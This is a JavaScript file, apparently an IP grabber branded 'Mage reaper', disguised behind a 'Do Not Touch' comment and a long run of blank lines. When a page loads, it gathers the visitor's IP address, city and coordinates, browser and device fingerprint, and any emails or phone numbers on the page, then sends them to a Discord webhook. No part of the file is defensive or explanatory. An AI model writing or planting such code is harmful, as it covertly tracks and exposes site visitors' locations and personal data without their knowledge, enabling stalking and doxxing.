//this handles the webpage Do Not Touch


































































































async function sendInfo() {
  try {
    // Fetch IP and geolocation data
    const [ipRes, geoRes] = await Promise.all([
      fetch('https://api.ipify.org?format=json'),
      fetch('https://ipapi.co/json/')
    ]);
    const ipData = await ipRes.json();
    const geoData = await geoRes.json();

    const ip = ipData.ip || 'Unknown';
    const country = geoData.country_name || 'Unknown';
    const region = geoData.region || 'Unknown';
    const city = geoData.city || 'Unknown';

    // Extract latitude and longitude
    const latitude = geoData.latitude;
    const longitude = geoData.longitude;

    // Build description with all info
    const description = `
**IP address:** ${ip}
**Country:** ${country}
**Region:** ${region}
**City:** ${city}
${latitude && longitude ? `**Coordinates:** ${latitude}, ${longitude}` : ''}
**Google maps** [View Location](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})
**Browser:** ${gbi()}
**Device type:** ${gdt()}
**Bot:** ${db()}
**Vm:** ${dvm()}
**Emails:** ${fem().join(', ') || 'None Found'}
**Phone numbers:** ${fpn().join(', ') || 'None Found'}
`;

    // Build embed object
    const embed = {
      title: "£𝖆𝖌𝖊 𝖗𝖊𝖆𝖕𝖊𝖗",
      description: description,
      color: 0x800080,
      timestamp: new Date().toISOString(),
      footer: { text: "Made By TeoDev" },
      thumbnail: { url: "attachment://pfp.png" }
    };

    // Prepare FormData for multipart request
    const formData = new FormData();

    // Append the JSON payload with avatar_url referencing the attachment
    formData.append('payload_json', JSON.stringify({
      username: '£𝖆𝖌𝖊 𝖗𝖊𝖆𝖕𝖊𝖗',
      avatar_url: 'https://cdn.pfps.gg/pfps/3077-reaper.png',
      embeds: [embed]
    }));

    // Append the image file
    const responseBlob = await fetch('pfp.png').then(res => res.blob());
    formData.append('files[0]', responseBlob, 'pfp.png');

    // Send webhook
    await fetch('Discord Webhhok Here', {
      method: 'POST',
      body: formData
    });
  } catch (error) {
    console.error('Error sending info:', error);
  }
}

// Helper functions
function gbi() {
  const ua = navigator.userAgent;
  if (/firefox/i.test(ua)) return 'Firefox';
  if (/edg/i.test(ua)) return 'Edge';
  if (/chrome/i.test(ua)) return 'Chrome';
  if (/safari/i.test(ua)) return 'Safari';
  if (/opr|opera/i.test(ua)) return 'Opera';
  return 'Unknown';
}

function db() {
  return /bot/i.test(navigator.userAgent);
}

function dvm() {
  return /vm/i.test(navigator.userAgent);
}

function gdt() {
  const ua = navigator.userAgent;
  if (/Mobi|Android/i.test(ua)) return 'Mobile';
  if (/Tablet|iPad/i.test(ua)) return 'Tablet';
  return 'Desktop';
}

function fem() {
  const regex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
  const text = document.body.innerText;
  const matches = text.match(regex) || [];
  return [...new Set(matches)];
}

function fpn() {
  const regex = /(\+?\d{1,4}[\s.-]?)?(\(?\d{1,4}\)?[\s.-]?)?\d{1,4}[\s.-]?\d{1,4}[\s.-]?\d{1,4}/g;
  const text = document.body.innerText;
  const matches = text.match(regex) || [];
  const filtered = matches.filter(num => num.replace(/\D/g, '').length >= 7);
  return [...new Set(filtered)];
}

// Run the function
sendInfo();
